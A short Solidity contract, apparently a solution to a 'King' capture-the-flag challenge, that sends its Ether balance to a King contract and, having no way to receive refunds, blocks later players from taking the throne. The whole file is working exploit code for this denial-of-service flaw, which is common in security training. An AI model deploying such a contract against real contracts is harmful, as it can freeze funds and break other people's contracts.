// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        address payable kingContractAddress = payable(contractAddress);
        (bool sent, ) = kingContractAddress.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
